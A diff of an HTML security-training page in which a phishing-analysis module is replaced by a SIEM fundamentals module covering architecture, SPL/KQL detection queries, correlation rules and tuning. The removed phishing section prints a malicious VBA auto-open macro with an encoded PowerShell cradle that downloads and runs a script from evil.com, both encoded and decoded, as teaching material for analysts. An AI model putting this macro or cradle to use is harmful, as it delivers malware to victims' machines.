@@ -1,76 +1,626 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
-<h6 class="text-danger mb-3"><i class="bi bi-book me-2"></i>Module 5: Phishing Analysis</h6>
+<h6 class="text-info mb-3"><i class="bi bi-layers me-2"></i>Module 5: SIEM Fundamentals</h6>
 
-<p style="color:#c0d0e0;">Phishing is the #1 initial access vector in breaches (Verizon DBIR 2025: 36% of breaches involve phishing). This module teaches you to analyze, prevent, and investigate phishing campaigns.</p>
+<h6 class="text-info mt-4 mb-2"><i class="bi bi-info-circle me-2"></i>1. SECTION OVERVIEW</h6>
+<p style="color:#c0d0e0;"><strong>What is SIEM?</strong> Security Information and Event Management (SIEM) combines Security Information Management (SIM — long-term log storage and analysis) with Security Event Management (SEM — real-time monitoring and alerting). SIEM systems collect logs from across the enterprise — firewalls, endpoints, servers, cloud services, network devices, applications — normalize them into a common schema, correlate events across sources, and generate alerts for suspicious activity.</p>
+<p style="color:#c0d0e0;"><strong>Why It Matters in a SOC:</strong> The SIEM is the SOC's central nervous system. Analysts live in the SIEM — it's where alerts appear, where investigations begin, and where evidence is documented. Without a SIEM, a SOC would drown in separate console dashboards with no correlation between events. A typical mid-size enterprise generates 10-50 GB of logs per day; a large enterprise generates 1-10 TB per day. No human can process this volume — SIEM automation is essential.</p>
+<p style="color:#c0d0e0;"><strong>Real-World Use Cases:</strong> Detecting lateral movement when a domain admin authenticates from a rogue workstation; correlating failed logins across 100 servers to identify a password spray campaign; triggering alerts when an antivirus detects malware on a server that doesn't normally download files; meeting compliance requirements (PCI DSS, HIPAA, SOX, GDPR) that mandate log retention and monitoring.</p>
+<p style="color:#c0d0e0;"><strong>Skills Gained:</strong> Building SIEM queries and dashboards; creating correlation rules; tuning false positives; log source integration; incident timeline reconstruction; compliance reporting; threat hunting using SIEM data.</p>
+<p style="color:#c0d0e0;"><strong>Prerequisites:</strong> Basic networking (TCP/IP, ports), operating system fundamentals, understanding of log types (syslog, Windows Event Log, JSON logs).</p>
+<p style="color:#c0d0e0;"><strong>Learning Objectives:</strong> (1) Explain SIEM architecture and data flow, (2) Write effective SIEM queries in SPL and KQL, (3) Create correlation rules that detect real attacks with low false positives, (4) Perform a full incident investigation using only SIEM data, (5) Tune and optimize SIEM performance.</p>
 
-<h6 class="text-danger mt-3">Sub-Domains / Rooms</h6>
+<h6 class="text-info mt-4 mb-2"><i class="bi bi-journal-text me-2"></i>2. DETAILED NOTES</h6>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Phishing Analysis</p>
-<p style="color:#c0d0e0;">When analyzing a suspicious email, follow this structured approach:</p>
+<p style="color:#00d4ff;font-weight:600;">Subtopic 1: SIEM Architecture & Data Ingestion</p>
+<p style="color:#c0d0e0;">A SIEM system is composed of several layers that work together to turn raw logs into actionable security intelligence. Understanding this architecture is critical for troubleshooting ingestion failures, optimizing storage, and designing effective detection rules.</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Complete Phishing Analysis Workflow:</b><br><br>
-<b>Step 1 — Header Analysis:</b><br>
-<code>From: security@paypa1.com (note: "paypa1" not "paypal")<br>
-Reply-To: attacker@protonmail.com<br>
-Return-Path: bounce@evil-phish.com<br>
-Received-SPF: fail (IP 185.130.5.201 not authorized for paypal.com)<br>
-DKIM: fail (signature did not verify)<br>
-DMARC: fail (p=reject, domain alignment failed)<br>
-Received: from mail.evil-server.com (185.130.5.201)</code><br><br>
-<b>Step 2 — URL Analysis:</b><br>
-The email contains: <code>&lt;a href="hxxps://bit.ly/3xK9mN2"&gt;Click to Verify Account&lt;/a&gt;</code><br>
-- Hover over link: Shows bit.ly URL (shortened = suspicious)<br>
-- Submit to URLScan.io: Redirect chain → bit.ly → 185.130.5.201/fake-paypal/login.php<br>
-- Final page: Cloned PayPal login page, HTML source shows form POST to <code>send.php</code><br>
-- Domain age: paypa1.com registered 2 days ago, privacy protection enabled<br><br>
-<b>Step 3 — Attachment Analysis:</b><br>
-The email has an attachment: <code>Invoice_2026.docm</code><br>
-- Extract metadata: Author="Microsoft User" (default), last saved by "Hacker"<br>
-- Static analysis with olevba: Finds VBA macro at stream M 7<br>
-<code>Private Sub Document_Open()<br>
-  Set obj = CreateObject("Wscript.Shell")<br>
-  obj.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQAKAA=='<br>
-End Sub</code><br>
-- Decode Base64: <code>IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')</code><br>
-- Dynamic sandbox: Document opens, PowerShell runs, downloads AgentTesla malware, establishes C2<br><br>
-<b>Step 4 — Conclusion & Reporting:</b><br>
-- Type: Targeted phishing campaign with malicious macro-enabled document<br>
-- Payload: AgentTesla info-stealer<br>
-- C2: 185.130.5.201:443<br>
-- IOCs: paypa1.com, 185.130.5.201, invoice_hash.docm, evil.com/payload.ps1<br>
-- Actions: Block all IOCs, delete email from all inboxes, alert employees
+<b>SIEM Architecture Breakdown:</b><br><br>
+<b>Data Collection Layer:</b><br>
+- <b>Forwarders/Agents:</b> Lightweight software installed on log sources (e.g., Splunk Universal Forwarder, Winlogbeat, rsyslog). They collect logs and forward them to the SIEM. Forwarders are "dumb" — they send everything and let the SIEM decide what's important.<br>
+- <b>Syslog:</b> Standard protocol (UDP 514, TCP 514) for network device logs. Many devices (Cisco, Palo Alto, Juniper) send syslog natively. Syslog is unencrypted by default; use Syslog-NG or rsyslog with TLS for secure transport.<br>
+- <b>Sysmon:</b> Microsoft's advanced logging tool for Windows. Logs process creation (Event ID 1), network connections (Event ID 3), file creation (Event ID 11), registry changes (Event ID 13), and much more. Sysmon with proper config (SwiftOnSecurity's config) is the gold standard for endpoint visibility.<br>
+- <b>Windows Event Forwarding (WEF):</b> Built-in Windows feature that forwards event logs to a central collector without installing third-party agents.<br>
+- <b>API-based Collection:</b> Cloud services (Office 365, AWS CloudTrail, Azure AD, GCP Audit Logs) are collected via REST APIs. Requires authentication (OAuth, API keys) and proper handling of rate limits.<br>
+- <b>Database Logs:</b> Database audit logs capture queries, login attempts, privilege changes. Collected via JDBC/ODBC or file-based forwarding.<br><br>
+<b>Processing/Normalization Layer:</b><br>
+- <b>Parsing:</b> Raw logs are unstructured text. The SIEM parses them into structured fields. Example: Raw syslog <code>&lt;134&gt;May 21 14:32:15 10.0.1.1 %ASA-6-302013: Built inbound TCP connection 12345 for outside:185.220.101.5/54321 (185.220.101.5/54321) to inside:10.0.1.50/80 (10.0.1.50/80)</code> is parsed into fields: <code>device="Cisco ASA"</code>, <code>src_ip="185.220.101.5"</code>, <code>dst_ip="10.0.1.50"</code>, <code>dst_port=80</code>, <code>action="connection built"</code>.<br>
+- <b>Normalization:</b> Different vendors call the same thing different names. One log says "src=1.2.3.4", another says "sourceAddress=1.2.3.4". Normalization maps all these to a common field (e.g., <code>src_ip</code>). Common schemas: CEF (ArcSight Common Event Format), LEEF (IBM), JSON.<br>
+- <b>Enrichment:</b> The SIEM adds context to logs during ingestion: GeoIP lookups (source IP is from Russia — risk score +20), threat intelligence lookups (source IP is on AlienVault OTX blocklist — risk score +50), asset lookup (destination is a domain controller — priority HIGH).<br><br>
+<b>Storage Layer:</b><br>
+- <b>Hot Storage:</b> Fast, expensive storage (SSD) for recent data (7-30 days). Used for active investigations and real-time queries.<br>
+- <b>Warm Storage:</b> Balanced performance/cost (HDD) for data 30-90 days old. Used for retrospective analysis.<br>
+- <b>Cold Storage:</b> Cheap, slow storage (S3, Glacier) for data 90+ days old. Used for compliance and historical investigations.<br>
+- <b>Indexing:</b> SIEMs use inverted indexes (like Splunk) or columnar storage (like Elasticsearch) to enable fast searches across billions of events. Index design directly impacts query performance.<br><br>
+<b>Enterprise Example — Splunk at Fortune 500 Bank:</b><br>
+- 50,000 endpoints forwarding Windows Event Log + Sysmon<br>
+- 5,000 network devices (firewalls, routers, switches) sending syslog<br>
+- 2,000 servers (Linux + Windows) sending OS logs<br>
+- 200+ cloud services via API<br>
+- Total: ~15 TB/day log volume<br>
+- Splunk cluster: 20 indexers (hot/warm), 4 search heads, S3 cold storage<br>
+- Retention: Hot 14 days, Warm 60 days, Cold 1 year
 </div>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Phishing Prevention</p>
-<p style="color:#c0d0e0;">Prevention is better than cure. Implement these technical controls and user training programs.</p>
+<p style="color:#00d4ff;font-weight:600;">Subtopic 2: SIEM Query Languages — SPL, KQL, and EQL</p>
+<p style="color:#c0d0e0;">Every SIEM has its own query language. SPL (Search Processing Language) for Splunk, KQL (Kusto Query Language) for Microsoft Sentinel/Azure Data Explorer, EQL for Elastic, and custom query languages for QRadar, ArcSight, and LogRhythm. Mastery of at least one query language is essential for any SOC analyst.</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Technical Controls:</b><br>
-1. <b>SPF/DKIM/DMARC:</b> Configure strict DMARC rejection (p=reject) to prevent domain spoofing<br>
-2. <b>Email Gateway:</b> Deploy Proofpoint, Mimecast, or Microsoft Defender for Office 365 — scans all inbound/outbound email<br>
-3. <b>URL Sandboxing:</b> Rewrite all URLs in emails, check reputation in real-time before allowing clicks<br>
-4. <b>Attachment Sandboxing:</b> Detonate all Office documents, PDFs, and archives in a sandbox before delivery<br>
-5. <b>DMARC Reporting:</b> Monitor DMARC aggregate reports to detect spoofing attempts<br><br>
-<b>User Training Program:</b><br>
-- <b>Monthly simulated phishing:</b> Send fake phishing emails to employees, track who clicks<br>
-- <b>Reporting button:</b> One-click Outlook plugin to report suspicious emails<br>
-- <b>Training modules:</b> Annual mandatory security awareness training<br>
-- <b>Reward program:</b> Gift cards for employees who report real phishing emails<br><br>
-<b>Metrics — Before vs After Training Program:</b><br>
-Before: 35% click rate → After 6 months: 8% click rate → After 12 months: 3% click rate<br>
-Report rate: 2% → 45% of suspicious emails reported before incident occurs
+<b>Splunk SPL — Common SOC Queries:</b><br><br>
+<b>1. Find all logins from a specific user:</b><br>
+<code>index=windows EventCode=4624 Account_Name=jdoe<br>
+| table _time, ComputerName, Account_Name, Source_Network_Address, Logon_Type<br>
+| sort -_time</code><br><br>
+<b>2. Detect brute force (multiple failed logins followed by success):</b><br>
+<code>index=windows EventCode=4625 Account_Name=*<br>
+| stats count as Failed_Attempts by Account_Name, Source_Network_Address<br>
+| where Failed_Attempts > 10<br>
+| join type=inner Account_Name, Source_Network_Address<br>
+   [search index=windows EventCode=4624<br>
+    | stats count as Successful_Logins by Account_Name, Source_Network_Address]<br>
+| table Account_Name, Source_Network_Address, Failed_Attempts, Successful_Logins</code><br><br>
+<b>3. Detect potential data exfiltration (large outbound transfers):</b><br>
+<code>index=proxy action=allowed<br>
+| stats sum(bytes) as Total_Bytes by src_ip, dest_ip, dest_port<br>
+| where Total_Bytes > 50000000<br>
+| sort -Total_Bytes<br>
+| table src_ip, dest_ip, dest_port, Total_Bytes</code><br><br>
+<b>4. Correlate authentication with process execution:</b><br>
+<code>index=windows (EventCode=4624 OR EventCode=4688)<br>
+| transaction maxspan=5m Account_Name, ComputerName<br>
+| where mvcount(EventCode) > 1<br>
+| table _time, Account_Name, ComputerName, EventCode, New_Process_Name</code><br><br>
+<b>Microsoft Sentinel KQL — Common SOC Queries:</b><br><br>
+<b>1. Find sign-ins from unusual locations:</b><br>
+<code>SigninLogs<br>
+| where TimeGenerated > ago(24h)<br>
+| where ResultType == 0<br>
+| summarize Count = count() by UserPrincipalName, Location, IPAddress, AppDisplayName<br>
+| where Location !in ("US", "Canada")<br>
+| sort by Count desc</code><br><br>
+<b>2. Detect password spray attack:</b><br>
+<code>SigninLogs<br>
+| where TimeGenerated > ago(1h)<br>
+| where ResultType == 50126  // Invalid password<br>
+| summarize FailedAttempts = count() by IPAddress, UserPrincipalName<br>
+| where FailedAttempts == 1  // Each user only hit once — classic password spray<br>
+| summarize TotalUsersHit = dcount(UserPrincipalName) by IPAddress<br>
+| where TotalUsersHit > 10</code><br><br>
+<b>3. Find lateral movement via RDP:</b><br>
+<code>DeviceLogonEvents<br>
+| where LogonType == 10 and ActionType == "LogonSuccess"<br>
+| where RemoteDeviceName != ""<br>
+| summarize count() by AccountDomain, AccountName, DeviceName, RemoteDeviceName, IPAddress<br>
+| sort by count_</code>
 </div>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Real-Phish Investigations</p>
-<p style="color:#c0d0e0;">Investigate real-world phishing campaigns to understand attacker infrastructure and identify compromised accounts.</p>
+<p style="color:#00d4ff;font-weight:600;">Subtopic 3: Correlation Rules & Detection Logic</p>
+<p style="color:#c0d0e0;">Correlation is what makes SIEMs powerful — connecting seemingly unrelated events from different sources to reveal an attack chain. A correlation rule takes inputs from multiple data sources and applies logic (AND, OR, sequence, threshold, time window) to generate an alert when the conditions match.</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Real Phishing Investigation Case:</b><br>
-<b>Situation:</b> 15 employees report receiving a fake DocuSign email. 3 employees entered their credentials.<br><br>
-<b>Investigation:</b><br>
-1. <b>Email analysis:</b> Headers show all emails from same infrastructure (IP 45.33.32.0/24), same phishing kit (same HTML structure, same exfiltration endpoint)<br>
-2. <b>Domain analysis:</b> docusign-verify[.]com registered 3 days ago, hosted on bulletproof hosting in Russia<br>
-3. <b>Phishing kit analysis:</b> Downloaded from the compromised server. Kit exfiltrates credentials to attacker@protonmail.com and stores them in /admin/logs.txt<br>
-4. <b>Impact assessment:</b> 3 users entered credentials. Check O365 sign-in logs: attacker accessed 2 mailboxes from IP 185.220.101.x at 03:00 UTC. Attacker searched for "password", "bank", "wire" in emails. No wire transfers occurred (financial team caught it).<br>
-5. <b>Remediation:</b> Reset 3 user passwords, revoke O365 sessions, enable MFA, block attacker IPs and domain at firewall, take down phishing site via hosting provider abuse contact, report to law enforcement<br>
-6. <b>Lessons learned:</b> Users didn't recognize "docusign-verify" as fake. Add domain similarity checks to email gateway. Increase phishing simulation frequency from monthly to bi-weekly.
+<b>Types of Correlation Rules:</b><br><br>
+<b>1. Aggregation Rules:</b> Count events over time and alert on thresholds.<br>
+<em>Example:</em> "Alert if any user has 10+ failed logins in 5 minutes" — detects brute force.<br>
+<em>Enterprise variation:</em> "Alert if any user has 50+ failed logins from 5+ different IPs in 10 minutes" — detects distributed brute force.<br><br>
+<b>2. Sequence Rules:</b> Detect events that must happen in a specific order.<br>
+<em>Example:</em> "Process Create (cmd.exe) → Network Connection (port 443) → DNS Query (DGA domain)" all within 10 seconds — detects malware beaconing out.<br>
+<em>Enterprise variation:</em> "User logon (4624) → Privilege escalation (4672) → Scheduled task creation (4698) → Network share access (5140)" — detects lateral movement pattern.<br><br>
+<b>3. Delta Rules:</b> Compare current behavior to a baseline.<br>
+<em>Example:</em> "User authenticated from IP 10.0.1.50 for 90 days, now authenticating from 45.33.32.156" — impossible travel or credential theft.<br>
+<em>Enterprise variation:</em> "Server outbound traffic volume increased 500% compared to same time last week" — potential data exfiltration.<br><br>
+<b>4. Temporal Rules:</b> Events that must happen within a specific time window.<br>
+<em>Example:</em> "Alert if user fails login (4625) then within 2 minutes succeeds login (4624) from same IP" — successful brute force.<br><br>
+<b>Building a Real Correlation Rule — Detecting Kerberoasting:</b><br>
+Kerberoasting is an attack where a domain user requests a Kerberos ticket for a service account, then cracks the ticket offline to get the service account password.<br><br>
+<em>Detection Logic:</em><br>
+<code>index=windows EventCode=4769 (TGS request) AND<br>
+Ticket_Encryption_Type=0x17 (RC4 — weak encryption used by attackers) AND<br>
+Service_Name=*$ (service account) AND<br>
+COUNT(EventCode) > 5 in 10 minutes (unusual volume)<br>
+→ ALERT: Kerberoasting attack suspected</code><br><br>
+<em>Splunk SPL Implementation:</em><br>
+<code>index=windows EventCode=4769 TicketEncryptionType=0x17 ServiceName=*$<br>
+| stats count by Account_Name, ServiceName, Source_Network_Address<br>
+| where count > 5<br>
+| table Account_Name, ServiceName, Source_Network_Address, count<br>
+| rename count as "TGS Requests (5 min)"</code><br><br>
+<em>Why this works:</em> Normal Kerberos requests use AES encryption (type 0x12 or 0x11). RC4 (0x17) is the legacy encryption type that attackers use because it's easier to crack. Normal users rarely request more than 1-2 TGS tickets in 5 minutes. A burst of 5+ is highly suspicious.<br><br>
+<b>Common Correlation Challenges & Mitigations:</b><br>
+- <b>False Positives:</b> Automated tools (vulnerability scanners, monitoring systems) trigger many alerts. Solution: Create allowlists for known-safe sources.<br>
+- <b>Alert Fatigue:</b> Too many alerts desensitize analysts. Solution: use alert severity tiers (low/med/high/critical) and tune aggressively.<br>
+- <b>Log Gaps:</b> Missing logs break correlation. Solution: monitor log source health and alert when log sources go silent.<br>
+- <b>Time Zone Mismatch:</b> Logs from different time zones confuse correlation windows. Solution: Normalize all timestamps to UTC.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Subtopic 4: SIEM Administration, Tuning & Compliance</p>
+<p style="color:#c0d0e0;">A SIEM requires ongoing maintenance. Rules must be tuned to reduce noise, log sources must be monitored for health, storage must be managed for cost and retention compliance, and detection coverage must be mapped to frameworks like MITRE ATT&CK.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>SIEM Tuning Methodology:</b><br><br>
+<b>Step 1 — Baseline:</b> Before tuning, collect 30 days of data with broad rules. This gives you a baseline of what "normal" looks like in your environment.<br><br>
+<b>Step 2 — Classify Alerts:</b> For each rule, categorize every alert for 2 weeks:<br>
+- <b>True Positive (TP):</b> Real malicious activity — 0-5% of alerts in most environments initially<br>
+- <b>False Positive (FP):</b> Benign activity that triggered the rule — 60-80% initially<br>
+- <b>Benign True Positive:</b> Real security event but expected (e.g., admin running vulnerability scan triggers C2 rule) — 10-20%<br><br>
+<b>Step 3 — Adjust:</b><br>
+- For FPs: Add exceptions (exclude specific users, IPs, processes). If a backup software triggers file modification alerts, exclude the backup account.<br>
+- For benign TPs: Reduce severity from High to Medium or Low.<br>
+- For rules with 0 TPs in 30 days: Consider disabling or converting to informational only.<br><br>
+<b>Step 4 — Monitor Metrics:</b><br>
+- <b>Alert Volume Trend:</b> Is it going up (more noise, possible misconfiguration) or down (better tuning, or attackers changing tactics)?<br>
+- <b>Mean Time to Detect (MTTD):</b> Average time from compromise to detection. Goal: minutes to hours.<br>
+- <b>Mean Time to Respond (MTTR):</b> Average time from detection to containment. Goal: hours.<br>
+- <b>False Positive Rate:</b> Percentage of alerts that are FPs. Target: &lt;30%.<br><br>
+<b>Compliance Logging Requirements:</b><br>
+| Standard | Log Retention | Key Requirements |
+|----------|--------------|------------------|
+| PCI DSS 4.0 | 12 months | Audit trails for all access, user activity monitoring, alert for suspicious events |
+| HIPAA | 6 years | Access logs, audit logs for all PHI systems, regular review of logs |
+| SOX | 7 years | All financial system access logs, change management records |
+| GDPR | As needed | Data breach detection logs, access logs for EU citizen data |
+| NIST 800-53 | 1+ years | System monitoring, audit record retention, automatic alerting |
+<br>
+<b>Log Source Health Monitoring:</b><br>
+- Check daily: Which log sources stopped sending logs (silent source = blind spot)?<br>
+- Check weekly: Which log sources show <b>ingestion gaps</b> (lost connectivity, buffer overflow)?<br>
+- Check monthly: Are all new assets (servers, cloud instances) configured to send logs?<br>
+<em>Splunk query for silent log sources:</em><br>
+<code>index=_internal source=*metrics.log* group=per_source_thruput<br>
+| stats latest(kbps) by series<br>
+| where latest(kbps) = 0<br>
+| table series, latest(kbps)</code><br><br>
+<b>Common Attacks on SIEMs:</b><br>
+- <b>Log Flooding:</b> Attackers generate massive log volume to hide malicious events. Detection: Monitor log volume per source — sudden spikes are suspicious.<br>
+- <b>Log Deletion:</b> Attackers delete logs to cover tracks. Detection: Use forwarder-side log buffering, send logs to two independent SIEMs, use immutable storage.<br>
+- <b>Time Manipulation:</b> Attackers change system time to break correlation windows. Detection: NTP monitoring, alert on clock skew &gt; 5 seconds.<br>
+- <b>Detection Opportunity:</b> Most SIEMs lack alerting for "no alerts". Install a heartbeat rule: "Alert if no events from source X in 30 minutes."
+</div>
+
+<h6 class="text-info mt-4 mb-2"><i class="bi bi-box-seam me-2"></i>3. CONCEPT BOXES</h6>
+
+<div class="alert alert-info">
+<strong>INFO BOX</strong><br>
+<b>SIEM vs Log Management vs XDR:</b> A log management system (like Elasticsearch) stores and searches logs. A SIEM adds correlation, alerting, and case management. XDR (Extended Detection and Response) goes further — it integrates endpoint, network, email, and cloud telemetry into a single platform with built-in automated response. Think of it as: Log Management → SIEM → XDR (increasing capability). Most modern SOCs use a SIEM + EDR combo, moving toward XDR platforms. Gartner predicts 60% of organizations will use XDR by 2027.
+</div>
+
+<div class="alert alert-success">
+<strong>REMEMBER BOX</strong><br>
+<b>Garbage In = Garbage Out.</b> A SIEM is only as good as the logs it receives. If endpoints aren't logging process execution (Event ID 4688), you won't detect malware execution. If firewalls aren't logging blocked traffic, you won't see scanning. Before writing detection rules, audit your log coverage. Map every MITRE ATT&CK technique to the data source needed to detect it. If you don't have the data, you can't detect the attack.
+</div>
+
+<div class="alert alert-warning">
+<strong>WARNING BOX</strong><br>
+<b>Alert Fatigue is Real and Dangerous.</b> A SOC that receives 10,000 alerts per day and ignores 95% is not doing security — it's doing noise reduction. The average SOC can investigate 50-100 alerts per analyst per day. Anything beyond that leads to missed critical alerts. A 2025 Ponemon Institute study found that 48% of security alerts are never investigated. Rule of thumb: If your SIEM generates more alerts than your team can investigate in one shift, stop adding rules and start tuning.
+</div>
+
+<div class="alert alert-info">
+<strong>SOC ANALYST TIP</strong><br>
+<b>Start Every Investigation with These 3 SPL Queries:</b><br>
+1. <code>index=* earliest=-7d | stats count by index | sort -count</code> — See all available data sources (what indexes have data?)<br>
+2. <code>index=windows EventCode=4625 Account_Name=* | stats count by Account_Name, Source_Network_Address | sort -count | head 20</code> — Check for active brute force (who's getting hit?)<br>
+3. <code>index=* sourcetype=* | stats count by sourcetype, host | sort -count | head 50</code> — Check overall data health (what hosts are sending what logs?)<br>
+These three queries give you the lay of the land in under 30 seconds.
+</div>
+
+<div class="alert alert-warning">
+<strong>INTERVIEW Q&A</strong><br>
+<b>Q: "Explain the difference between a SIEM rule that uses aggregation vs one that uses sequence."</b><br>
+<b>A:</b> "An aggregation rule counts events over time and alerts on thresholds. For example, 'alert if 10 failed logins in 5 minutes' doesn't care what order or source — just the count. A sequence rule requires events to happen in a specific order. For example, 'alert if Process Create (cmd.exe) THEN Network Connection within 10 seconds' — this detects a specific behavior pattern. Aggregation is good for volumetric attacks (brute force, DDoS), while sequence is good for multi-stage attacks (malware execution chain, lateral movement)."<br><br>
+<b>Q: "A critical SIEM rule stopped firing — how do you troubleshoot?"</b><br>
+<b>A:</b> "First, check if the log source is still sending data (use a source health dashboard). Second, check if the log format changed (vendor update might have changed field names). Third, check if the rule was modified recently. Fourth, test the rule manually with known malicious data. Fifth, check if there was a SIEM update or configuration change. I'd also run a query counting events that match each condition of the rule to find where the chain breaks."<br><br>
+<b>Q: "How would you design a SIEM deployment for a company with 10,000 endpoints, 500 servers, and AWS cloud?"</b><br>
+<b>A:</b> "I'd start with log source priorities: first onboard domain controllers (most critical for auth monitoring), then EDR/Sysmon on endpoints, then cloud audit logs (CloudTrail, VPC Flow Logs), then network devices. I'd size storage for 30+ days hot and 1 year cold. I'd create log source health alerts first, then deploy priority detection rules (Kerberoasting, brute force, lateral movement, ransomware patterns). I'd build a tiered alert system with critical alerts paging on-call, high alerts for 24h SOC review, and medium alerts batched for daily review."
+</div>
+
+<h6 class="text-info mt-4 mb-2"><i class="bi bi-diagram-3 me-2"></i>4. VISUAL DIAGRAMS</h6>
+<pre class="mermaid">
+flowchart TD
+    A["Data Sources"] --> B["Log Forwarders/Agents"]
+    
+    subgraph Sources["Data Sources"]
+        S1["Windows Event Log + Sysmon"]
+        S2["Firewall/Network (Syslog)"]
+        S3["Linux Syslog"]
+        S4["Cloud APIs (AWS/Azure/GCP)"]
+        S5["EDR/Antivirus"]
+        S6["Database Audit Logs"]
+    end
+    
+    subgraph Forwarders["Collection Layer"]
+        F1["Splunk Universal Forwarder"]
+        F2["Winlogbeat / Filebeat"]
+        F3["rsyslog / syslog-ng"]
+        F4["Cloud API Connectors"]
+    end
+    
+    Sources --> Forwarders
+    Forwarders --> C["SIEM Processing Pipeline"]
+    
+    subgraph Pipeline["Processing Layer"]
+        P1["Parse raw → structured fields"]
+        P2["Normalize to common schema"]
+        P3["Enrich (GeoIP, Threat Intel, Asset DB)"]
+        P4["Tag & Classify"]
+    end
+    
+    C --> Pipeline
+    Pipeline --> D["Indexing & Storage"]
+    
+    subgraph Storage["Storage Tier"]
+        ST1["Hot (SSD) — 7-30 days"]
+        ST2["Warm (HDD) — 30-90 days"]
+        ST3["Cold (S3/Glacier) — 90+ days"]
+    end
+    
+    D --> Storage
+    Storage --> E["Search Head / Query Layer"]
+    
+    E --> F["Analyst Workflow"]
+    
+    subgraph Workflow["Analyst Actions"]
+        W1["Investigate alerts"]
+        W2["Write queries"]
+        W3["Create dashboards"]
+        W4["Build correlation rules"]
+        W5["Generate compliance reports"]
+    end
+    
+    F --> Workflow
+    E --> G["Alert Engine"]
+    G --> H["Correlation Rules"]
+    H --> I["Alert Queue"]
+    I --> J["Soc Dashboard / Ticketing System"]
+    J --> W1
+</pre>
+
+<h6 class="text-info mt-4 mb-2"><i class="bi bi-mortarboard me-2"></i>5. TRYHACKME SECTION</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Room</th><th style="color:#00d4ff;text-align:left;">Difficulty</th><th style="color:#00d4ff;text-align:left;">Objectives</th><th style="color:#00d4ff;text-align:left;">Completion Order</th></tr>
+<tr><td>Splunk 101</td><td>Easy</td><td>Learn SPL basics, search syntax, field extraction, tables, stats, eval commands</td><td>1</td></tr>
+<tr><td>Splunk 102</td><td>Easy</td><td>Advanced SPL — subsearches, lookups, macros, event types, tags, datasets</td><td>2</td></tr>
+<tr><td>Splunk: Exploring The ELK Stack</td><td>Medium</td><td>Understand Elasticsearch, Logstash, Kibana architecture and query syntax</td><td>3</td></tr>
+<tr><td>Log Operations</td><td>Medium</td><td>Implement centralized logging, parse custom logs, create alerts based on log analysis</td><td>4</td></tr>
+<tr><td>Splunk: Dashboard & Reports</td><td>Medium</td><td>Build visual dashboards, scheduled reports, alert configurations in Splunk</td><td>5</td></tr>
+<tr><td>Splunk: Data Manipulation</td><td>Hard</td><td>Complex data transformations — rex, multivalue fields, streamstats, eventstats, transaction commands</td><td>6</td></tr>
+<tr><td>ELK Stack</td><td>Medium</td><td>Hands-on with Elasticsearch queries, Kibana visualizations, Logstash pipeline configuration</td><td>7</td></tr>
+<tr><td>Wazuh</td><td>Medium</td><td>Open-source SIEM/XDR platform setup — log collection, FIM, vulnerability detection, active response</td><td>8</td></tr>
+<tr><td>Splunk: Advanced Dashboards</td><td>Hard</td><td>Advanced visualization techniques — trellis charts, map visualizations, custom panels</td><td>9</td></tr>
+<tr><td>Splunk: Threat Hunting</td><td>Hard</td><td>Proactive threat hunting using Splunk — hypothesis-driven investigation with real APT data</td><td>10</td></tr>
+</table>
+</div>
+
+<h6 class="text-info mt-4 mb-2"><i class="bi bi-shield-shaded me-2"></i>6. HACK THE BOX ACADEMY SECTION</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Module</th><th style="color:#00d4ff;text-align:left;">Difficulty</th><th style="color:#00d4ff;text-align:left;">Learning Outcomes</th></tr>
+<tr><td>Introduction to SIEM</td><td>Easy</td><td>Understand SIEM evolution, components, deployment models (on-prem, cloud, hybrid), common platforms comparison</td></tr>
+<tr><td>Log Analysis & Ingestion</td><td>Medium</td><td>Configure log forwarders, parse syslog and Windows events, troubleshoot ingestion pipelines</td></tr>
+<tr><td>Splunk Fundamentals</td><td>Medium</td><td>Complete SPL mastery, create searches that extract actionable intelligence from raw logs</td></tr>
+<tr><td>Windows Event Logs & Sysmon</td><td>Medium</td><td>Deep understanding of Windows Event Log IDs, Sysmon event codes, detection significance of each event type</td></tr>
+<tr><td>SIEM Correlation Rules</td><td>Hard</td><td>Design advanced correlation rules chaining multiple conditions — temporal, aggregation, sequence logic</td></tr>
+<tr><td>SIEM Tuning & Optimization</td><td>Hard</td><td>Reduce FP rate from 80% to under 20%, optimize search performance, manage storage costs</td></tr>
+<tr><td>Threat Hunting with SIEM</td><td>Hard</td><td>Proactive threat hunting methodologies using SIEM data, hypothesis testing, hunting maturity model</td></tr>
+<tr><td>Compliance Monitoring with SIEM</td><td>Medium</td><td>Map detection rules to PCI DSS, HIPAA, SOX, GDPR compliance requirements</td></tr>
+</table>
+</div>
+
+<h6 class="text-info mt-4 mb-2"><i class="bi bi-shield-check me-2"></i>7. LETSDEFEND SECTION</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Investigation/Scenario</th><th style="color:#00d4ff;text-align:left;">Type</th><th style="color:#00d4ff;text-align:left;">Description</th></tr>
+<tr><td>SOC146 — Malicious PowerShell With Log Analysis</td><td>Alert Triage</td><td>Investigate a PowerShell execution alert in SIEM — decode encoded commands, trace parent process, determine if malicious</td></tr>
